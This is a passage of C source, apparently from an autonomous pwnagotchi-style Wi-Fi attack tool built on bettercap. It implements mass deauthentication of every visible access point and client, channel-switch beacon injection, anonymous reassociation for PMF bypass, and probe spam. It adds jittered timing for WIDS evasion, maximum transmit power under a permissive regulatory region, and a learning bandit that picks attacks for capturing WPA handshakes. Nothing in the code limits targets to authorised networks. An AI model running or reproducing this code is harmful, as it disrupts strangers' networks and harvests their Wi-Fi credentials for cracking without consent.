        fprintf(stderr, "[brain] v3.0 state saved + exported (epoch %d)\n",
                e->epoch_num);

        /* Re-check for fresh PC distillation each save cycle */
        if (v3_distillation_import(ctx->v3, ctx->thompson,
                                   "/tmp/pc_distillation_v3.json") == 0) {
            fprintf(stderr, "[brain] v3.0 PC distillation re-imported\n");
        }
    }

    /* Advance epoch */
    e->epoch_num++;
    brain_epoch_reset(e);
}

/* ============================================================================
 * Mood System
 * ========================================================================== */

/* Forward declarations — defined after should_really_be_bored() */
static brain_frustration_t diagnose_frustration(brain_ctx_t *ctx);
static void brain_hulk_smash(brain_ctx_t *ctx);

void brain_set_mood(brain_ctx_t *ctx, brain_mood_t mood) {
    if (ctx->mood != mood) {
        ctx->mood = mood;

        /* Diagnose frustration when entering SAD or ANGRY */
        if (mood == MOOD_SAD || mood == MOOD_ANGRY) {
            ctx->frustration = diagnose_frustration(ctx);
        } else {
            ctx->frustration = FRUST_GENERIC;
        }

        /* HULK MODE: Last resort when ANGRY - throw EVERYTHING at every AP.
         * Mass deauth, raw broadcast deauth all APs, probe spam, CSA to all.
         * Fires on first ANGRY transition, then every 5 epochs while still ANGRY. */
        if (mood == MOOD_ANGRY && ctx->bcap) {
            brain_hulk_smash(ctx);
        }

        fprintf(stderr, "[brain] mood: %s%s%s\n", brain_mood_names[mood],
                (mood == MOOD_SAD || mood == MOOD_ANGRY) ? " reason=" : "",
                (mood == MOOD_SAD || mood == MOOD_ANGRY) ? brain_frustration_names[ctx->frustration] : "");
        
        if (ctx->on_mood_change) {
            ctx->on_mood_change(mood, ctx->callback_user_data);
        }
    }
}

bool brain_has_support_network(brain_ctx_t *ctx, float factor) {
    float support = ctx->epoch.tot_bond_factor;
    return support >= factor;
}

/* ============================================================================
 * HULK SMASH - Last Resort Nuclear Attack
 *
 * Inspired by hulk-plugin-topceekretts-edition.
 * Fires when mood transitions to ANGRY (all normal attacks have failed).
 * Throws everything at every visible AP simultaneously:
 *   - wifi.deauth * x3 (bettercap mass deauth, triple blast)
 *   - Raw broadcast deauth to EVERY visible AP
 *   - Raw probe spam on current channel
 *   - Raw CSA beacons to EVERY AP (force channel switch)
 *   - Raw anon reassoc to EVERY AP (PMF bypass)
 * Phase 11 callback fires for UI (HULK face + rage quote).
 * ========================================================================== */

static void brain_hulk_smash(brain_ctx_t *ctx) {
    fprintf(stderr, "[brain] === HULK SMASH! === Last resort nuclear attack!\n");

    /* Fire HULK UI callback (phase 11) */
    if (ctx->on_attack_phase) {
        ctx->on_attack_phase(11, ctx->callback_user_data);
    }

    /* Triple mass deauth via bettercap */
    for (int blast = 0; blast < 3; blast++) {
        bcap_send_command(ctx->bcap, "wifi.deauth *");
        usleep(jitter_usleep(500000));  /* 350-650ms between blasts (jittered for WIDS evasion) */
    }

    /* Raw injection: hit EVERY visible AP */
    if (g_raw_sock >= 0) {
        int ap_count = bcap_get_ap_count(ctx->bcap);
        for (int i = 0; i < ap_count; i++) {
            bcap_ap_t ap;
            if (bcap_get_ap(ctx->bcap, i, &ap) != 0) continue;

            /* Broadcast deauth */
            attack_deauth_broadcast(g_raw_sock, &ap);

            /* CSA beacon (force channel switch to ch14) */
            attack_csa_beacon(g_raw_sock, &ap);
            attack_csa_action(g_raw_sock, &ap);

            /* Anon reassoc (PMF bypass) */
            attack_anon_reassoc(g_raw_sock, &ap);

            /* Deauth every client on this AP */
            int sta_count = bcap_get_sta_count(ctx->bcap);
            for (int s = 0; s < sta_count; s++) {
                bcap_sta_t sta;
                if (bcap_get_sta(ctx->bcap, s, &sta) != 0) continue;
                if (memcmp(sta.ap_bssid.addr, ap.bssid.addr, 6) != 0) continue;
                attack_deauth_bidi(g_raw_sock, &ap, &sta);
                attack_disassoc_bidi(g_raw_sock, &ap, &sta);
            }

            fprintf(stderr, "[hulk] SMASHED %s (%s) ch%d\n",
                    ap.ssid, "", ap.channel);
        }

        /* Probe spam on current channel */
        attack_probe_undirected(g_raw_sock);
    }

    /* Track epoch activity */
    ctx->epoch.any_activity = true;
    brain_epoch_track(&ctx->epoch, true, false, false, false, false, 3);

    fprintf(stderr, "[brain] === HULK SMASH COMPLETE ===\n");
}

/* SMART BORED CHECK: Only be bored if ALL visible APs have FULL handshakes
 * Why be bored if there's still work to do?
 * Performance: result is cached per-epoch (called 5 times, scan_handshake_stats
 * and bcap iteration are expensive on Pi Zero). Cache invalidated in brain_epoch_next(). */
static bool should_really_be_bored(brain_ctx_t *ctx) {
    /* Return cached result if still valid this epoch */
    if (ctx->bored_cache_valid) {
        return ctx->bored_cached_result;
    }

    /* Update handshake quality cache */
    scan_handshake_stats();
    
    int ap_count = bcap_get_ap_count(ctx->bcap);
    if (ap_count == 0) {
        /* No APs visible = lonely, not bored */
        ctx->bored_cache_valid = true;
        ctx->bored_cached_result = false;
        return false;
    }
    
    int aps_needing_handshakes = 0;
    int aps_with_full = 0;
    int aps_with_partial = 0;
    
    for (int i = 0; i < ap_count; i++) {
        bcap_ap_t ap;
        if (bcap_get_ap(ctx->bcap, i, &ap) != 0) continue;
        
        /* Skip filtered APs */
        if (ctx->config.filter_weak && ap.rssi < ctx->config.min_rssi) {
            continue;
        }
        
        char mac_str[BRAIN_MAC_STR_LEN];
        mac_to_str(&ap.bssid, mac_str);
        
        hs_quality_t q = get_handshake_quality(mac_str);
        
        switch (q) {
            case HS_QUALITY_FULL:
            case HS_QUALITY_PMKID:
                aps_with_full++;
                break;
            case HS_QUALITY_PARTIAL:
                aps_with_partial++;
                aps_needing_handshakes++;
                break;
            case HS_QUALITY_NONE:
            default:
                aps_needing_handshakes++;
                break;
        }
    }
    
    /* visible_aps removed: was computed but never used (Sprint 1 fix #26) */
    
    fprintf(stderr, "[brain] BORED CHECK: %d visible APs, %d need handshakes, %d partial, %d full\n",
            ap_count, aps_needing_handshakes, aps_with_partial, aps_with_full);
    
    /* Only be TRULY bored if we've conquered ALL visible APs */
    if (aps_needing_handshakes > 0) {
        fprintf(stderr, "[brain] NOT BORED: %d APs still need handshakes!\n", aps_needing_handshakes);
        ctx->bored_cache_valid = true;
        ctx->bored_cached_result = false;
        return false;
    }
    
    /* If we have partials, we could upgrade them - not really bored */
    if (aps_with_partial > 0) {
        fprintf(stderr, "[brain] NOT BORED: %d partials could be upgraded\n", aps_with_partial);
        ctx->bored_cache_valid = true;
        ctx->bored_cached_result = false;
        return false;
    }
    
    /* All visible APs have FULL handshakes - CONQUEST COMPLETE! */
    fprintf(stderr, "[brain] TRULY BORED: all %d visible APs have full handshakes!\n", aps_with_full);
    ctx->bored_cache_valid = true;
    ctx->bored_cached_result = true;
    return true;
}

/* FRUSTRATION DIAGNOSIS: Figure out WHY attacks are failing.
 * Called when mood is about to be set to SAD or ANGRY.
 * Scans uncaptured APs to find the dominant problem. */
static brain_frustration_t diagnose_frustration(brain_ctx_t *ctx) {
    int ap_count = bcap_get_ap_count(ctx->bcap);
    if (ap_count == 0) return FRUST_GENERIC;

    int uncaptured = 0;
    int no_clients = 0;
    int wpa3_count = 0;
    int weak_signal = 0;

    for (int i = 0; i < ap_count; i++) {
        bcap_ap_t ap;
        if (bcap_get_ap(ctx->bcap, i, &ap) != 0) continue;

        /* Skip filtered APs */
        if (ctx->config.filter_weak && ap.rssi < ctx->config.min_rssi) continue;

        char mac_str[BRAIN_MAC_STR_LEN];
        mac_to_str(&ap.bssid, mac_str);

        hs_quality_t q = get_handshake_quality(mac_str);
        if (q == HS_QUALITY_FULL || q == HS_QUALITY_PMKID) continue;

        /* This AP is uncaptured — analyze why it might be failing */
        uncaptured++;

        if (ap.clients_count == 0) no_clients++;

        /* WPA3 = encryption contains "WPA3" or "SAE" */
        if (strstr(ap.encryption, "WPA3") || strstr(ap.encryption, "SAE"))
            wpa3_count++;

        /* Borderline signal: passes filter but barely (-70 to min_rssi) */
        if (ap.rssi < -70 && ap.rssi >= ctx->config.min_rssi)
            weak_signal++;
    }

    if (uncaptured == 0) return FRUST_GENERIC;

    brain_frustration_t reason = FRUST_GENERIC;

    /* Priority: WPA3 > no clients > weak signal > deauths ignored */
    if (wpa3_count == uncaptured) {
        reason = FRUST_WPA3;
    } else if (no_clients == uncaptured) {
        reason = FRUST_NO_CLIENTS;
    } else if (weak_signal == uncaptured) {
        reason = FRUST_WEAK_SIGNAL;
    } else if (ctx->epoch.num_deauths > 10 && ctx->epoch.num_shakes == 0) {
        reason = FRUST_DEAUTHS_IGNORED;
    }

    fprintf(stderr, "[brain] frustration: %s (uncaptured=%d no_clients=%d wpa3=%d weak=%d deauths=%d)\n",
            brain_frustration_names[reason], uncaptured, no_clients, wpa3_count, weak_signal,
            ctx->epoch.num_deauths);

    return reason;
}

/* Accessor for UI to query frustration reason */
brain_frustration_t brain_get_frustration(brain_ctx_t *ctx) {
    return ctx->frustration;
}

/* Determine mood based on epoch state */
static void brain_update_mood(brain_ctx_t *ctx) {
    brain_epoch_t *e = &ctx->epoch;
    brain_config_t *c = &ctx->config;
    
    /* Check if stale (too many misses) */
    bool is_stale = e->num_missed > c->max_misses_for_recon;
    
    if (is_stale) {
        /* If all APs are fully captured, missing recons don't matter —
         * there's nothing to recon. Stay bored, not angry/lonely. */
        if (should_really_be_bored(ctx)) {
            brain_set_mood(ctx, MOOD_BORED);
        } else {
            float factor = (float)e->num_missed / c->max_misses_for_recon;
            if (factor >= 2.0f) {
                if (brain_has_support_network(ctx, factor)) {
                    brain_set_mood(ctx, MOOD_GRATEFUL);
                } else {
                    brain_set_mood(ctx, MOOD_ANGRY);
                }
            } else {
                if (brain_has_support_network(ctx, 1.0f)) {
                    brain_set_mood(ctx, MOOD_GRATEFUL);
                } else {
                    brain_set_mood(ctx, MOOD_LONELY);
                }
            }
        }
    } else if (e->sad_for > 0) {
        /* If all APs are fully captured, cap mood at BORED — escalation to
         * SAD/ANGRY only makes sense when attacks are actually failing,
         * not when there's simply nothing left to attack. */
        if (should_really_be_bored(ctx)) {
            brain_set_mood(ctx, MOOD_BORED);
        } else {
            float factor = (float)e->inactive_for / c->sad_num_epochs;
            if (factor >= 2.0f) {
                if (brain_has_support_network(ctx, factor)) {
                    brain_set_mood(ctx, MOOD_GRATEFUL);
                } else {
                    brain_set_mood(ctx, MOOD_ANGRY);
                }
            } else {
                if (brain_has_support_network(ctx, factor)) {
                    brain_set_mood(ctx, MOOD_GRATEFUL);
                } else {
                    brain_set_mood(ctx, MOOD_SAD);
                }
            }
        }
    } else if (e->bored_for > 0) {
        float factor = (float)e->inactive_for / c->bored_num_epochs;
        if (brain_has_support_network(ctx, factor)) {
            brain_set_mood(ctx, MOOD_GRATEFUL);
        } else {
            /* SMART BORED: Only be bored if ALL visible APs have FULL handshakes!
             * If there's still work to do (missing/partial handshakes), stay normal! */
            if (should_really_be_bored(ctx)) {
                brain_set_mood(ctx, MOOD_BORED);
            } else {
                /* There's still work to do - stay in normal mode and keep hunting! */
                brain_set_mood(ctx, MOOD_NORMAL);
            }
        }
    } else if (e->active_for >= c->excited_num_epochs) {
        brain_set_mood(ctx, MOOD_EXCITED);
    } else if (e->active_for >= 5 && brain_has_support_network(ctx, 5.0f)) {
        brain_set_mood(ctx, MOOD_GRATEFUL);
    } else {
        /* Phase 2.5: Set mood based on mobility mode instead of generic NORMAL */
        switch (ctx->mobility_ctx.current_mode) {
            case MOBILITY_DRIVING:
                brain_set_mood(ctx, MOOD_DRIVING);
                break;
            case MOBILITY_WALKING:
                brain_set_mood(ctx, MOOD_WALKING);
                break;
            case MOBILITY_STATIONARY:
            default:
                /* Stationary: hunting (actively attacking) vs soaking (passive) */
                if (e->num_deauths > 0 || e->num_assocs > 0) {
                    brain_set_mood(ctx, MOOD_HUNTING);
                } else {
                    /* AUDIT FIX: MOOD_SOAKING for passive stationary */
                    brain_set_mood(ctx, MOOD_SOAKING);
                }
                break;
        }
    }
}

/* ============================================================================
 * Interaction History (Throttling)
 * ========================================================================== */

bool brain_should_interact(brain_ctx_t *ctx, const char *mac) {
    time_t now = time(NULL);
    
    for (int i = 0; i < ctx->history_count; i++) {
        if (strcasecmp(ctx->history[i].mac, mac) == 0) {
            /* Found in history - check if TTL expired */
            if (now - ctx->history[i].last_interaction < BRAIN_HISTORY_TTL) {
                return false;  /* Still throttled */
            }
            /* TTL expired, update and allow */
            ctx->history[i].last_interaction = now;
            return true;
        }
    }
    
    /* Not in history, allow */
    return true;
}

void brain_add_history(brain_ctx_t *ctx, const char *mac) {
    time_t now = time(NULL);
    
    /* Check if already in history */
    for (int i = 0; i < ctx->history_count; i++) {
        if (strcasecmp(ctx->history[i].mac, mac) == 0) {
            ctx->history[i].last_interaction = now;
            return;
        }
    }
    
    /* Expand if needed */
    if (ctx->history_count >= ctx->history_capacity) {
        int new_cap = ctx->history_capacity ? ctx->history_capacity * 2 : 64;
        brain_history_entry_t *new_hist = realloc(ctx->history,
            new_cap * sizeof(brain_history_entry_t));
        if (!new_hist) return;
        ctx->history = new_hist;
        ctx->history_capacity = new_cap;
    }
    
    /* Add new entry */
    strncpy(ctx->history[ctx->history_count].mac, mac, BRAIN_MAC_STR_LEN - 1);
    ctx->history[ctx->history_count].mac[BRAIN_MAC_STR_LEN - 1] = '\0';
    ctx->history[ctx->history_count].last_interaction = now;
    ctx->history_count++;
}

void brain_prune_history(brain_ctx_t *ctx) {
    time_t now = time(NULL);
    int write_idx = 0;
    
    for (int i = 0; i < ctx->history_count; i++) {
        if (now - ctx->history[i].last_interaction < BRAIN_HISTORY_TTL) {
            if (write_idx != i) {
                ctx->history[write_idx] = ctx->history[i];
            }
            write_idx++;
        }
    }
    ctx->history_count = write_idx;
}

/* ============================================================================
 * Bettercap Commands
 * ========================================================================== */

int brain_recon(brain_ctx_t *ctx) {
    /* AUDIT FIX: Show MOOD_SCANNING during active recon */
    brain_set_mood(ctx, MOOD_SCANNING);

    /* Start recon */
    int ret = bcap_send_command(ctx->bcap, "wifi.recon on");
    if (ret < 0) {
        fprintf(stderr, "[brain] failed to start wifi.recon\n");
        return ret;
    }
    
    /* Set channels if configured */
    if (ctx->config.channels && ctx->config.num_channels > 0) {
        char cmd[256] = "wifi.recon.channel ";
        int pos = strlen(cmd);
        for (int i = 0; i < ctx->config.num_channels; i++) {
            if (i > 0) pos += snprintf(cmd + pos, sizeof(cmd) - pos, ",");
            pos += snprintf(cmd + pos, sizeof(cmd) - pos, "%d",
                           ctx->config.channels[i]);
        }
        ret = bcap_send_command(ctx->bcap, cmd);
    } else {
        ret = bcap_send_command(ctx->bcap, "wifi.recon.channel clear");
    }
    
    return ret;
}

int brain_set_channel(brain_ctx_t *ctx, int channel) {
    if (channel < 1 || channel > 165) return -1;  /* 2.4GHz (1-14) + 5GHz (36-165) */
    if (channel == ctx->current_channel) return 0;
    
    /* Determine wait time based on activity */
    int wait_ms = 0;
    if (ctx->epoch.did_deauth) {
        wait_ms = ctx->config.hop_recon_time * 1000;
    } else if (ctx->epoch.did_associate) {
        wait_ms = ctx->config.min_recon_time * 1000;
    }
    
    if (ctx->current_channel != 0 && wait_ms > 0) {
        fprintf(stderr, "[brain] waiting %dms before hop to ch %d\n", wait_ms, channel);
        usleep(wait_ms * 1000);
    }
    
    /* Send channel hop command */
    char cmd[64];
    snprintf(cmd, sizeof(cmd), "wifi.recon.channel %d", channel);
    int ret = bcap_send_command(ctx->bcap, cmd);
    
    if (ret >= 0) {
        ctx->current_channel = channel;
        brain_epoch_track(&ctx->epoch, false, false, false, true, false, 1);
        
        if (ctx->on_channel_change) {
            ctx->on_channel_change(channel, ctx->callback_user_data);
        }
    }
    
    return ret;
}

int brain_associate(brain_ctx_t *ctx, const bcap_ap_t *ap) {
    /* Check if stale */
    if (ctx->epoch.num_missed > ctx->config.max_misses_for_recon) {
        return 0;  /* Skip - recon is stale */
    }
    
    /* Check throttle */
    char mac_str[BRAIN_MAC_STR_LEN];
    mac_to_str(&ap->bssid, mac_str);
    
    if (!brain_should_interact(ctx, mac_str)) {
        return 0;  /* Throttled */
    }
    
    /* Check if association is enabled */
    if (!ctx->config.associate) {
        return 0;
    }
    
    /* Send associate command */
    char cmd[64];
    snprintf(cmd, sizeof(cmd), "wifi.assoc %s", mac_str);
    
    fprintf(stderr, "[brain] associating with %s (%s) ch%d %ddBm\n",
            ap->ssid, mac_str, ap->channel, ap->rssi);
    
    int ret = bcap_send_command(ctx->bcap, cmd);
    
    if (ret >= 0) {
        brain_epoch_track(&ctx->epoch, false, true, false, false, false, 1);
        brain_add_history(ctx, mac_str);
        
        if (ctx->on_associate) {
            ctx->on_associate(ap, ctx->callback_user_data);
            attack_log_add(ap->ssid, mac_str, "assoc", "ok", ap->rssi, ap->channel);
        }
        
        /* Throttle delay */
        if (ctx->config.throttle_a > 0) {
            /* Sprint 4 #16: RSSI-proportional delay */
            float rssi_mult = rssi_delay_multiplier(ap->rssi);
            usleep((useconds_t)(ctx->config.throttle_a * 1000000 * rssi_mult));
        }
    } else {
        /* Check if it's an "unknown BSSID" error - AP moved out of range */
        brain_epoch_track(&ctx->epoch, false, false, false, false, true, 1);
    }
    
    return ret;
}

int brain_deauth(brain_ctx_t *ctx, const bcap_ap_t *ap, const bcap_sta_t *sta) {
    if (ctx->epoch.num_missed > ctx->config.max_misses_for_recon) return 0;
    char sta_mac_str[BRAIN_MAC_STR_LEN];
    mac_to_str(&sta->mac, sta_mac_str);
    if (!brain_should_interact(ctx, sta_mac_str)) return 0;
    if (ctx->stealth && stealth_should_throttle_deauth(ctx->stealth)) return -1;
    if (!ctx->config.deauth) return 0;

    char ap_mac_str[BRAIN_MAC_STR_LEN];
    mac_to_str(&ap->bssid, ap_mac_str);

    /* Channel is already set by the caller's channel iteration loop.
     * Don't set/clear channel here - that breaks the per-channel attack flow. */

    fprintf(stderr, "[brain] DEAUTH %s from %s (%s) ch%d\n",
            sta_mac_str, ap->ssid, ap_mac_str, ap->channel);

    /* Single targeted deauth (like JayOS: wifi.deauth <STA_MAC>)
     * Burst of 3 was too aggressive - causes firmware issues on nexmon */
    char cmd[128];
    snprintf(cmd, sizeof(cmd), "wifi.deauth %s", sta_mac_str);
    int ret = bcap_send_command(ctx->bcap, cmd);

    if (ret >= 0) {
        brain_add_history(ctx, sta_mac_str);
        if (ctx->stealth) stealth_record_deauth(ctx->stealth);
        if (ctx->on_deauth) ctx->on_deauth(ap, sta, ctx->callback_user_data);
        attack_log_add(ap->ssid, sta_mac_str, "deauth", "ok", ap->rssi, ap->channel);

        /* Throttle between deauths (like JayOS) */
        if (ctx->config.throttle_d > 0) {
            /* Sprint 4 #16: RSSI-proportional deauth delay */
            float rssi_d_mult = rssi_delay_multiplier(ap->rssi);
            usleep((useconds_t)(ctx->config.throttle_d * 1000000 * rssi_d_mult));
        }
    } else {
        brain_epoch_track(&ctx->epoch, false, false, false, false, true, 1);
    }
    return ret;
}

/* ============================================================================
 * Main Brain Loop
 * ========================================================================== */

/* ============================================================================
 * Attack-Type Thompson Sampling (#2) + Encryption-Aware Routing (#10)
 *
 * Instead of fixed epoch%8 rotation, each AP learns which attack phase
 * works best via a per-AP Thompson Sampling bandit.
 * WPA3/SAE APs are automatically routed away from deauth/disassoc phases.
 * ========================================================================== */

/* Get or create an attack tracker for this AP */
static brain_attack_tracker_t *get_attack_tracker(brain_ctx_t *ctx, const char *mac) {
    for (int i = 0; i < ctx->attack_tracker_count; i++) {
        if (strcasecmp(ctx->attack_tracker[i].mac, mac) == 0)
            return &ctx->attack_tracker[i];
    }
    /* Create new tracker */
    if (ctx->attack_tracker_count < BRAIN_BLACKLIST_MAX) {
        brain_attack_tracker_t *t = &ctx->attack_tracker[ctx->attack_tracker_count++];
        memset(t, 0, sizeof(*t));
        strncpy(t->mac, mac, BRAIN_MAC_STR_LEN - 1);
        t->first_attack = time(NULL);
        /* Initialize attack bandit with uniform prior */
        for (int ph = 0; ph < BRAIN_NUM_ATTACK_PHASES; ph++) {
            t->atk_alpha[ph] = BRAIN_ATTACK_ALPHA_INIT;
            t->atk_beta[ph]  = BRAIN_ATTACK_BETA_INIT;
        }
        t->last_attack_phase = -1;
        return t;
    }
    return NULL;
}

/* ts_beta_sample: using extern from channel_bandit.c */

/* Select best attack phase for this AP using Thompson Sampling
 * WPA3 APs have deauth(2) and disassoc(4) penalized heavily (#10) */
static int select_attack_phase(brain_attack_tracker_t *tracker, bool is_wpa3, const bool *phase_enabled) {
    float best_score = -1.0f;
    int best_phase = 0;

    for (int ph = 0; ph < BRAIN_NUM_ATTACK_PHASES; ph++) {
        /* Sprint 7: skip disabled phases */
        if (phase_enabled && !phase_enabled[ph]) continue;
        float score = ts_beta_sample(tracker->atk_alpha[ph], tracker->atk_beta[ph]);

        /* Encryption-aware routing (#10):
         * WPA3/SAE APs with PMF ignore standard deauths and disassocs.
         * Penalize phases 2 (deauth) and 4 (disassoc) for WPA3 targets,
         * and boost phases 3 (PMF bypass) and 5 (rogue M2). */
        if (is_wpa3) {
            if (ph == 2 || ph == 4) score *= 0.05f;  /* 95% penalty */
            if (ph == 3 || ph == 5) score *= 2.0f;   /* 100% boost */
        }

        if (score > best_score) {
            best_score = score;
            best_phase = ph;
        }
    }
    return best_phase;
}

/* Observe attack outcome: update the per-AP per-phase bandit */
static void observe_attack_outcome(brain_attack_tracker_t *tracker, int phase, bool success) {
    if (phase < 0 || phase >= BRAIN_NUM_ATTACK_PHASES) return;
    if (success) {
        tracker->atk_alpha[phase] += 1.0f;
    } else {
        tracker->atk_beta[phase] += 0.3f;  /* Smaller penalty for failure (exploration-friendly) */
    }
    /* Cap total evidence (ESS) to prevent overflow and maintain exploration.
     * Check alpha+beta (effective sample size), not just alpha alone. */
    if (tracker->atk_alpha[phase] + tracker->atk_beta[phase] > 50.0f) {
        tracker->atk_alpha[phase] *= 0.8f;
        tracker->atk_beta[phase]  *= 0.8f;
    }
}

/* qsort comparator: sort candidates by RSSI descending (strongest first) */
static int cmp_candidate_rssi(const void *a, const void *b) {
    const ts_entity_t *ea = *(const ts_entity_t *const *)a;
    const ts_entity_t *eb = *(const ts_entity_t *const *)b;
    /* Descending: higher RSSI first */
    return (eb->last_rssi > ea->last_rssi) - (eb->last_rssi < ea->last_rssi);
}


static void *brain_thread_func(void *arg) {
    brain_ctx_t *ctx = (brain_ctx_t *)arg;
    
    fprintf(stderr, "[brain] thread started\n");

    /* Sprint 4: Initialize mobility tracking */
    ctx->last_lat = 0.0;
    ctx->last_lon = 0.0;
    ctx->mobility_score = 0.0f;
    ctx->last_mobility_check = time(NULL);
    ctx->last_ap_count = 0;


    /* AUDIT FIX: Initialize EAPOL monitor for real-time handshake detection */
    if (eapol_monitor_init(&ctx->eapol_mon, "wlan0mon") == 0) {
        /* Phase 1A: Register capture callback for real-time Thompson rewards */
        eapol_monitor_set_callback(&ctx->eapol_mon, brain_eapol_callback, ctx);
        if (eapol_monitor_start(&ctx->eapol_mon) == 0) {
            fprintf(stderr, "[brain] EAPOL monitor started (callback registered)\n");
        } else {
            fprintf(stderr, "[brain] WARNING: EAPOL monitor start failed\n");
        }
    } else {
        fprintf(stderr, "[brain] WARNING: EAPOL monitor init failed\n");
    }

    /* Phase 1C: Initialize mobility mode detector */
    mobility_mode_init(&ctx->mobility_ctx);
    fprintf(stderr, "[brain] Mobility mode detector initialized\n");
    /* AUDIT FIX: Initialize mode-specific pipelines */
    drv_init(&ctx->driving);
    walk_init(&ctx->walking);
    stat_init(&ctx->stationary);
    channel_map_init(&ctx->channel_map);
    model_inference_init();
    fprintf(stderr, "[brain] Mode pipelines initialized (drv/walk/stat/cmap/model)\n");


    /* Starting mood */
    brain_set_mood(ctx, MOOD_STARTING);
    
    /* Wait for bettercap connection (up to 90s for slow Pi Zero boot).
     * bcap_ws reconnects in background with exponential backoff (2s, 4s, 8s...)
     * so bettercap may take 30-60s to fully start on Pi Zero W. */
    int retries = 0;
    while (!bcap_is_connected(ctx->bcap) && retries < 90) {
        usleep(1000000);  /* 1 second */
        retries++;
    }
    if (!bcap_is_connected(ctx->bcap)) {
        fprintf(stderr, "[brain] bettercap connection timeout after %ds — entering epoch loop anyway\n", retries);
        fprintf(stderr, "[brain] bcap_ws will keep reconnecting in background\n");
        /* DON'T kill the brain thread — enter epoch loop and let it run.
         * bcap_ws background thread will keep reconnecting, and the epoch
         * loop handles a disconnected bcap gracefully (polls fail/noop). */
    }
    
    /* Push bettercap wifi settings (like JayOS _reset_wifi_settings) */
    bcap_send_command(ctx->bcap, "set wifi.ap.ttl 120");
    bcap_send_command(ctx->bcap, "set wifi.sta.ttl 300");
    {
        /* DUAL RSSI THRESHOLD: Set bettercap scan threshold LOW (-90) to see ALL APs
         * for WiFi census/mapping. Brain's min_rssi (-75) filters attack targets only.
         * This separates SCANNING (see everything) from ATTACKING (strong targets). */
        bcap_send_command(ctx->bcap, "set wifi.rssi.min -90");
    }
    /* Disable bettercap auto-skip: we manage handshake tracking ourselves */
    bcap_send_command(ctx->bcap, "set wifi.deauth.acquired false");
    bcap_send_command(ctx->bcap, "set wifi.assoc.acquired false");
    /* Suppress bettercap's own log spam - our brain logs everything */
    bcap_send_command(ctx->bcap, "set wifi.assoc.silent true");
    bcap_send_command(ctx->bcap, "set wifi.deauth.silent true");
    bcap_send_command(ctx->bcap, "set wifi.channel_switch_announce.silent true");
    /* Maximize TX power and set permissive regulatory region */
    /* Sprint 6: Set initial TX power from config */
    {
        char _txcmd[64];
        snprintf(_txcmd, sizeof(_txcmd), "set wifi.txpower %d", ctx->config.tx_power_max);
        bcap_send_command(ctx->bcap, _txcmd);
    }
    bcap_send_command(ctx->bcap, "set wifi.region BO");
    fprintf(stderr, "[brain] pushed bettercap wifi settings (ap.ttl=120, sta.ttl=300, rssi.min=%d, acquired=off, txpower=30, region=BO)\n",
            ctx->config.min_rssi);

    /* Open raw injection socket for advanced attacks (v6: auth+assoc, deauth_bcast, probe, anon_reassoc, disassoc, rogue_m2) */
    srand(time(NULL) ^ getpid()); /* seed RNG for rogue MACs */
    g_raw_sock = attack_raw_inject_open();
    if (g_raw_sock < 0) {
        fprintf(stderr, "[brain] WARNING: raw injection unavailable\n");
    }

    /* Start recon */
    brain_recon(ctx);
    usleep(ctx->config.recon_time * 1000000);


    /* AUDIT FIX: Build channel map from per-AP scan data */
    {
        int _cmn = bcap_get_ap_count(ctx->bcap);
        if (_cmn > 0 && _cmn <= 256) {
            int _cch[256], _ccl[256], _crs[256];
            bool _ccp[256];
            for (int ai = 0; ai < _cmn; ai++) {
                bcap_ap_t _cma;
                if (bcap_get_ap(ctx->bcap, ai, &_cma) == 0) {
                    _cch[ai] = _cma.channel;
                    _ccl[ai] = _cma.clients_count;
                    _crs[ai] = _cma.rssi;
                    char _cmm[18];
                    mac_to_str(&_cma.bssid, _cmm);
                    _ccp[ai] = (get_handshake_quality(_cmm) == HS_QUALITY_FULL);
                } else {
                    _cch[ai] = 0; _ccl[ai] = 0; _crs[ai] = -100; _ccp[ai] = false;
                }
            }
            channel_map_build(&ctx->channel_map, _cch, _ccl, _ccp, _crs, _cmn, NULL);

            /* AUDIT FIX: Blend ML channel yield predictions into channel_map scores.
             * predict_channel_yield() returns P(handshake) per channel from
             * time-of-day + day-of-week patterns learned on PC Brain. */
            {
                channel_query_t _cq;
                float _ml_yield[14];
                time_t _cqt = time(NULL);
                struct tm *_cqtm = localtime(&_cqt);
                _cq.time_of_day = _cqtm ? (float)_cqtm->tm_hour / 24.0f : 0.5f;
                _cq.gps_zone = 0.0f;
                _cq.day_of_week = _cqtm ? (float)_cqtm->tm_wday / 7.0f : 0.5f;
                if (predict_channel_yield(&_cq, _ml_yield) == 0) {
                    /* Boost channel_map entries with ML yield (additive 20% weight) */
                    for (int ci = 0; ci < ctx->channel_map.count; ci++) {
                        int ch = ctx->channel_map.entries[ci].channel;
                        if (ch >= 1 && ch <= 14) {
                            float ml_boost = _ml_yield[ch - 1] * CMAP_W_UNCAPTURED * 0.2f;
                            ctx->channel_map.entries[ci].expected_yield += ml_boost;
                        }
                    }
                }
            }
        }
    }

    /* Sprint 7 #20: Initial adaptive timing based on first scan */
    adapt_epoch_timing(ctx);
    
    /* Ready mood */
    brain_set_mood(ctx, MOOD_READY);
    ctx->started_at = time(NULL);
    
    /* Hold COOL face for 3 seconds so user actually sees it before attacks start.
     * Without this, the first attack_phase fires within ~200ms and stomps FACE_COOL
     * with ANIM_UPLOAD, making MOOD_READY invisible. */
    sleep(3);
    
    /* Initial handshake quality scan  populate cache before first epoch */
    scan_handshake_stats();
    gps_refine_init();
    /* Main loop */
    bool was_manual = false;
    while (ctx->running) {
        /* ---- MANUAL MODE GATE ----
         * When MANUAL, brain idles — no autonomous attacks.
         * Bettercap stays running so user can control it manually. */
        if (ctx->manual_mode) {
            if (!was_manual) {
                fprintf(stderr, "[brain] MANUAL MODE - brain idle, bettercap stays running\n");
                brain_set_mood(ctx, MOOD_BORED);
                was_manual = true;
            }
            usleep(500000);
            continue;
        }
        if (was_manual) {
            fprintf(stderr, "[brain] AUTO MODE - brain resuming autonomous attacks\n");
            was_manual = false;
            /* Fall through to normal epoch loop */
        }

        /* Mode Bandit: Select operating mode at start of epoch */
        time_t now = time(NULL);
        bool mode_expired = (now - ctx->mode_started) > 300;  /* 5 min per mode */
        
        if (mode_expired || ctx->mode_handshakes >= 3) {
            /* Observe outcome for previous mode */
            ts_observe_mode_outcome(ctx->thompson, ctx->current_mode, 
                                    ctx->mode_handshakes > 0);
            
            /* Select new mode */
            ctx->current_mode = ts_select_mode(ctx->thompson);
            ctx->mode_started = now;
            ctx->mode_handshakes = 0;
            
            fprintf(stderr, "[brain] mode switch: %s\n", ts_mode_name(ctx->current_mode));
        }
        
        /* Let bettercap hop freely during recon (like JayOS) */
        bcap_send_command(ctx->bcap, "wifi.recon.channel clear");

        /* Poll bettercap for events (100ms timeout) */
